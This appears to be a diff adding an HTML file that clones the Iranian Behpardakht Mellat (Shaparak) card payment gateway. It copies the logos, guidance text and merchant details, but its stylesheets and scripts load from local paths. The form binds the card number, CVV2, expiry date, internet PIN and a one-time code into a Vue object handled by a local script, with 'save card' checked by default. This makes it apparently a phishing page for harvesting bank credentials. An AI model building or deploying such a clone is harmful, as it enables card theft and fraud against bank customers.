@@ -1,0 +1,416 @@
+<!doctype html>
+<html dir="rtl" lang="fa" xmlns:v-on="http://www.w3.org/1999/xhtml" xmlns:v-bind="http://www.w3.org/1999/xhtml">
+
+<head>
+	<meta charset="utf-8">
+	<meta name="referrer" content="never" />
+	<title>پرداخت اینترنتی به پرداخت ملت</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href="https://bpm.shaparak.ir/pgwchannel/img/ipg-favicon.ico" rel="shortcut icon">
+
+	<!-- <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,600,700,800" rel="stylesheet"
+		type="text/css">
+	<link href="https://fonts.googleapis.com/css?family=Baloo+Bhaina" rel="stylesheet">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script> -->
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+	<link rel="stylesheet" type="text/css" href="public/style.css">
+</head>
+
+<body id="body">
+	<div id="app" v-cloak>
+		<header id="header">
+			<div class="container">
+				<div class="beh-card">
+					<a class="change-languge"
+					href="#">
+					EN</a>
+
+					<div class="row">
+						<div class="col shaparaklogo align-self-start"><img src="public/img/asset 0.svg" alt="shaparak">
+						</div>
+						<div class="col-6 header-center align-self-end">
+							<span>پرداخت اینترنتی به پرداخت ملت</span><br>
+
+
+
+							<span class="behpardakht_a">www.Behpardakht.com</span>
+
+						</div>
+						<div class="col behpardakhtlogo align-self-start"><img src="public/img/asset 1.svg"
+								alt="behpardakht">
+						</div>
+					</div>
+				</div>
+			</div>
+		</header>
+
+		<div class="main-wrapper payment">
+			<section class="container">
+				<div class="row row-eq-height">
+					<div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
+						<div class="beh-card carddetail">
+							<div class="background-overflow">
+								<span class="shape"></span>
+							</div>
+
+							<div class="card-header">
+								<h3>اطلاعات کارت</h3>
+								<span id="remaining-time">زمان باقی مانده :
+									<b id="timer-count">
+										{{ min < 10 ? '0' : '' }}{{min}}:{{ sec < 10 ? '0' : '' }}{{sec}}
+									</b>
+								</span>
+							</div>
+							<div class="card-body">
+								<form class="card-info">
+									<div class="form-group row">
+										<div class="col-sm-4">
+											<label for="cardnumber" class="col-form-label">شماره کارت</label>
+											<small id="number-text">شماره کارت 16 رقمی درج شده روی کارت را وارد نمایید</small>
+										</div>
+
+										<div class="col-md-6 col-sm-8 col-12 mobile-justify">
+											<div class="cardnumberbox" id="cardnumberbox">
+												<span class="banklogo"></span>
+												<input type="tel" id="cardnumber" maxlength="19" autocomplete="off" @keypress="isNumber($event)" @input="enterNumber()" v-model="cardInfo.number">
+												<button type="button" id="card-list-button" data-toggle="dropdown"
+													class="pointer-btn" aria-haspopup="true" aria-expanded="false"
+													tabindex="-1"></button>
+												<div class="card-suggestionlist dropdown-menu"
+													aria-labelledby="card-list-button" style="max-height: 349.061px;">
+
+												</div>
+											</div>
+										</div>
+									</div>
+
+									<div class="form-group row">
+										<div class="col-sm-4">
+											<label for="inputcvv2" class="col-form-label">شماره شناسایی دوم
+												(CVV2)</label>
+											<small id="cvv2-text">شماره 3 یا 4 رقمی درج شده روی کارت را وارد نمایید</small>
+										</div>
+										<div class="col-md-6 col-sm-6 col-10  mobile-justify keypad-parent">
+											<input v-model="cardInfo.cvv2" type="password" class="form-control" id="inputcvv2" maxlength="4"
+                                                autocomplete="off" @keypress="isNumber($event)">
+										</div>
+										<div class="col-sm-1">
+											<button type="button" id="cvv2KeyPad" class="form-btn keypad pointer-btn" tabindex="-1"
+												@click="showKeypad(1)"></button>
+										</div>
+									</div>
+
+									<div class="form-group row">
+										<div class="col-sm-4">
+											<label for="inputmonth" class="col-form-label">تاریخ انقضای کارت</label>
+											<small id="engheza-text">تاریخ انقضای کارت را وارد کنید </small>
+										</div>
+
+										<div class="col-2 d-lg-none d-sm-none"></div>
+
+										<div class="col-md-2 col-sm-3 col-4">
+											<input v-model="cardInfo.month" type="tel" class="form-control" id="inputmonth" maxlength="2"
+												placeholder="ماه" autocomplete="off" @keypress="isNumber($event)">
+										</div>
+										<div class="col-md-2 col-sm-3 col-4">
+											<input v-model="cardInfo.year" type="tel" class="form-control" id="inputyear" maxlength="2"
+												placeholder="سال" autocomplete="off" @keypress="isNumber($event)">
+										</div>
+									</div>
+
+									<div class="form-group row">
+										<div class="col-sm-4">
+											<label for="inputcapcha" class="col-form-label">کد امنیتی</label>
+											<small id="sec-text">لطفا کد امنیتی داخل کادر را وارد نمایید</small>
+										</div>
+										<div class="col-sm-3 col-8 mobile-justify">
+											<input v-model="cardInfo.sec" type="tel" class="form-control" id="inputcapcha" maxlength="5"
+												autocomplete="off" @keypress="isNumber($event)">
+										</div>
+										<div class="col-sm-3 col-6 capcha-container mobile-justify">
+											<img id="captcha-img" :src="`public/img/captchaimg${imgNumber}.jpg`">
+										</div>
+										<div class="col-sm-1 col-4">
+											<button @click="changeCap()" type="button" id="captcha-button" class="form-btn pointer-btn capcha"
+												title="نمايش کد جديد"></button>
+										</div>
+									</div>
+									<div class="form-group row" onblur="hideKeypad()">
+										<div class="col-sm-4">
+											<label for="inputpin" class="col-form-label">رمز اینترنتی کارت</label>
+											<small id="pass-text">رمز اینترنتی را وارد نمایید</small>
+										</div>
+
+										<div class="col-md-6 col-sm-6 col-10 mobile-justify keypad-parent">
+											<div class="cardnumberbox" id="dynamic-pin">
+												<input v-model="cardInfo.pass" type="password" class="form-control" id="inputpin" maxlength="12"
+													autocomplete="off" @keypress="isNumber($event)">
+												<button class="sendpin" type="button" id="otp-button"
+													data-toggle="dropdown" @click="validateAndRequestOTP()"
+													aria-haspopup="true" aria-expanded="false" tabindex="-1">دریافت رمز
+													پویا
+												</button>
+											</div>
+										</div>
+										<div class="col-sm-1 ">
+											<button type="button" class="form-btn keypad pointer-btn" tabindex="-1"
+											@click="showKeypad(2)" ></button>
+										</div>
+									</div>
+
+									<div class="form-group row">
+										<div class="col-sm-4">
+											<label for="inputemail" class="col-form-label">ایمیل</label>
+											<small>لطفا ایمیل معتبر وارد کنید (اختیاری)</small>
+										</div>
+										<div class="col-md-6 col-sm-8 col-12 mobile-justify">
+											<input type="email" class="form-control" id="inputemail"
+												onfocus="removeInvalidClassFromInput(&#39;inputemail&#39;)"
+												style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA3ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpiYmZkZTQxOS00ZGRkLWU5NDYtOWQ2MC05OGExNGJiMTA3N2YiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDAyNDkwMkRDOTIyMTFFNkI0MzFGRTk2RjM1OTdENTciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDAyNDkwMkNDOTIyMTFFNkI0MzFGRTk2RjM1OTdENTciIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OTU2NTE1NDItMmIzOC1kZjRkLTk0N2UtN2NjOTlmMjQ5ZGFjIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOmJiZmRlNDE5LTRkZGQtZTk0Ni05ZDYwLTk4YTE0YmIxMDc3ZiIv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&quot;) !important; background-repeat: no-repeat; background-size: 20px; background-position: 97% center; cursor: auto;"
+												data-temp-mail-org="0">
+										</div>
+									</div>
+
+
+									<div class="form-group row">
+										<div class="col-sm-4"></div>
+										<div class="col-sm-8">
+											<div class="form-check">
+												<input class="form-check-input" type="checkbox" id="savePanCheckbox"
+													checked="">
+												<label class="form-check-label" for="savePanCheckbox">
+													ذخیره کارت برای استفاده‌های بعدی
+												</label>
+											</div>
+										</div>
+									</div>
+
+									<div class="form-group row">
+										<div class="col-sm-4"></div>
+										<div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
+											<span id="error-box" class="card-errorbox shaparak_shit_message">
+												{{alertText}}
+											</span>
+										</div>
+									</div>
+									
+									<div class="form-group row">
+										<div class="col-sm-4"></div>
+										<div :class="loading === true ? 'col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form perches-requested' : 'col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form'">
+											<button @click="submitInfo()" type="button" class="btn btn-perches" id="payButton" >
+												<img v-if="loading" style="transform: translateY(1.9px);opacity: 0.8;" width="22px" src="public/img/spiner.webp">
+												پرداخت
+											</button>
+											<button type="button" class="btn btn-decline">انصراف</button>
+										</div>
+									</div>
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div id="alert-box">
+						{{alertText}}
+					</div>
+
+					<div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
+						<div class="beh-card merchantdetail">
+							<div class="card-header">
+								<h3>اطلاعات پذیرنده</h3>
+							</div>
+							<div class="card-body">
+
+								<div class="merchant-container">
+									<div class="col-lg-12 col-sm-4 merchant-logo-mobile">
+										<!--<img class=" " src="img/sample/merchant-logo.png" alt="merchantlogo">-->
+										<img class=" " src="public/img/asset 3.png" alt="merchantlogo">
+										<span class="helper"></span>
+									</div>
+
+									<ul class="col-lg-12 col-sm-8 merchant-detail">
+										<li>نام پذیرنده : <b>بانک ملت</b></li>
+										<li>شماره پذیرنده: <b>1427467</b></li>
+
+
+										<li>شماره ترمینال: <b>2080879</b></li>
+										<li>آدرس وب سایت: <b class="merchantwebsite">
+
+
+
+												<span class="merchant_a" title="https://www.behpardakht.com">
+													https://behpardakht.com</span>
+											</b></li>
+
+
+
+									</ul>
+
+								</div>
+
+								<ul class="merchant-detail price">
+									<li>مبلغ قابل پرداخت :<b class="price-number">2,790,000 &nbsp; ریال</b></li>
+								</ul>
+							</div>
+
+						</div>
+
+					</div>
+				</div>
+			</section>
+
+			<div id="keypad" class="keypad-container">
+				<h4>
+					<div class="input-group input-group-sm"> <span class="form-control border_none "
+							aria-describedby="closeBtn"> صفحه کلید امن</span>
+						<div class="input-group-prepend "> <button id="closeBtn" type="button"
+								class="close-button-pinpad" @click="hideKeypad()"></button> </div>
+					</div>
+				</h4>
+				<div class="frame-umbtn"><button id="num1" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">1</button></div>
+				<div class="frame-umbtn"><button id="num2" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">2</button></div>
+				<div class="frame-umbtn"><button id="num3" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">3</button></div>
+				<div class="frame-umbtn"><button id="num4" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">4</button></div>
+				<div class="frame-umbtn"><button id="num5" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">5</button></div>
+				<div class="frame-umbtn"><button id="num6" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">6</button></div>
+				<div class="frame-umbtn"><button id="num7" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">7</button></div>
+				<div class="frame-umbtn"><button id="num8" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">8</button></div>
+				<div class="frame-umbtn"><button id="clear" type="button" class=" numpad" tabindex="-1"
+						onclick="keyPadBackspace(event)">⌫</button></div>
+				<div class="frame-umbtn"><button id="num9" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">9</button></div>
+				<div class="frame-umbtn"><button id="num0" type="button" class=" numpad" tabindex="-1"
+						onclick="fillField(this,event)">0</button></div>
+				<div class="frame-umbtn"><button id="tab-key" type="button" class=" numpad" tabindex="-1"
+						onclick="keypadTab()" style="color: #27d286;">✔</button></div>
+			</div>
+
+
+
+
+			<div class="modal large-modal top_layer fade show" id="dynamic-pin-modal" tabindex="-1" role="dialog"
+				aria-labelledby="ModalLabel" aria-hidden="true" style="display: none">
+				<div class="modal-dialog modal-dialog-centered" role="document">
+					<div class="modal-content">
+						<div class="modal-header">
+							<h5 class="modal-title">توجه</h5>
+							<button type="button" onclick="removeDynamicPinDialog();focusField(&#39;inputcvv2&#39;)"
+								class="close" data-dismiss="modal" aria-label="Close">
+								<span aria-hidden="true">×</span>
+							</button>
+						</div>
+						<div class="modal-body">
+							<p>مشتری گرامی، در شرایط ذیل نیازی به فشردن دکمه درخواست رمز پویا نمی باشد:<br>اگر از روش
+								هایی
+								نظیر برنامک های رمز ساز استفاده می نمایید رمز خود را در قسمت رمز دوم وارد فرمایید. در
+								صورتی
+								که تاکنون نسبت به پویا سازی رمز دوم کارت خود اقدام ننموده اید، میتوانید حداکثر تا تاریخ
+								98/11/05 از رمز ایستای خود استفاده فرمایید.</p>
+						</div>
+						<div class="modal-footer">
+							<button type="button" id="dynamic-pin-dialog-button" class="btn btn-primary"
+								onclick="removeDynamicPinDialog();focusField(&#39;inputcvv2&#39;)">متوجه شدم</button>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="modal-backdrop fade show" id="dynamic-pin-modal-backdrop" style="display: none"></div>
+
+			<section class="container">
+				<row class="beh-guid">
+					<div class="col">
+						<h4>راهنمای استفاده از رمز پویا</h4>
+						<ul>
+							<li>رمز پویا، رمز یکبار مصرفی است که به جای رمز دوم کارت استفاده میشود.</li>
+							<li><b>مرحله اول</b>- براساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعالسازی رمز پویا
+								اقدام
+								نمایید.</li>
+							<li><b>مرحله دوم</b>- رمز پویا را بر اساس روش اعلامی از طرف بانک صادرکننده کارت، به یکی از
+								روشهای زیر دریافت کنید.</li>
+							<li>1- دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک</li>
+							<li>2- دریافت از طریق کد USSD بانک صادرکننده کارت شما</li>
+							<li>3- دریافت از طریق زدن دکمه ی "دریافت رمز پویا" در درگاه پرداخت اینترنتی</li>
+							<li><b>مرحله سوم</b>- پس از دریافت رمز به یکی از روشهای فوق، رمز پویای دریافت شده را در محل
+								تعیین شده برای "رمز دوم" وارد نمایید و سپس مابقی اطلاعات را تکمیل نمایید.</li>
+							<br><br>
+						</ul>
+					</div>
+				</row>
+			</section>
+			<section class="container">
+				<row class="beh-guid">
+					<div class="col">
+						<h4>راهنما و نکات ایمنی</h4>
+						<ul>
+							<li>شماره کارت: 16 رقمی بوده و بصورت 4 قسمت 4 رقمی روی کارت درج شده است.</li>
+							<li>cvv2: با طول 3 یا 4 رقم کنار شماره کارت و یا پشت کارت درج شده است.</li>
+							<li>تاریخ انقضا: شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است.</li>
+							<li>رمز اینترنتی: با عنوان رمز دوم و در برخی موارد با PIN2 شناخته می شود، از طریق بانک صادر
+								کننده کارت تولید شده و همچنین از طریق دستگاه های خودپرداز بانک صادر کننده قابل تهیه و یا
+								تغییر می باشد.</li>
+							<li>کد امنیتی: بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه فرایند خرید ، کد موجود
+								که به
+								صورت عددی در تصویر مشخص شده است در محل پیش بینی شده درج شود.</li>
+							<li>دروازه پرداخت اینترنتی به پرداخت ملت با استفاده از پروتکل امن https به مشتریان خود ارایه
+								خدمت نموده و با آدرس <b>https://bpm.shaparak.ir</b> شروع می شود. خواهشمند است به منظور
+								جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر
+								وب
+								خود را با آدرس فوق مقایسه نمایید و درصورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما
+								درمیان بگذارید.</li>
+							<li>برای جلوگیری از افشای رمز کارت خود،حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
+							<li>لطفا از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
+							<li>برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان
+								اینترنتی با
+								ما تماس بگیرید.</li>
+							<br><br>
+						</ul>
+					</div>
+				</row>
+			</section>
+		</div>
+		<footer class="footer">
+			<div class="container">
+				<div class="footerarc" style=""></div>
+				<div class="footerarc content" style="">
+					<span class="call">شماره تماس: 27312733-021 </span><br>
+					<span>شرکت به پرداخت ملت ارايه دهنده خدمات نوین پرداخت الکترونيک</span>
+				</div>
+				<div class="row justify-content-center">
+					<div class="col-12">
+
+					</div>
+				</div>
+			</div>
+		</footer>
+
+		<form method="post" name="returnForm"
+			action="https://hub.iranserver.com/modules/is_modules/IsModules/ISGateway/CallBack/MellatShr.php">
+			<input type="hidden" id="RefId" name="RefId" value="F8FBFB39C6C4C690">
+			<input type="hidden" id="ResCode" name="ResCode">
+			<input type="hidden" id="SaleOrderId" name="SaleOrderId" value="767997">
+		</form>
+		<form method="post" name="resultForm" action="https://bpm.shaparak.ir/pgwchannel/result.mellat"
+			accept-charset="UTF-8">
+			<input type="hidden" name="RefId" value="F8FBFB39C6C4C690">
+		</form>
+	</div>
+
+	<!-- Scripts -->
+	<script src="/reload/reload.js"></script>
+	<script type="text/javascript" src="node_modules/vue/dist/vue.js"></script>
+	<script type="text/javascript" src="node_modules/vue-resource/dist/vue-resource.js"></script>
+	<script type="text/javascript" src="node_modules/scrollmonitor/scrollMonitor.js"></script>
+	<script type="text/javascript" src="public/script.js"></script>
+</body>
+
+</html>
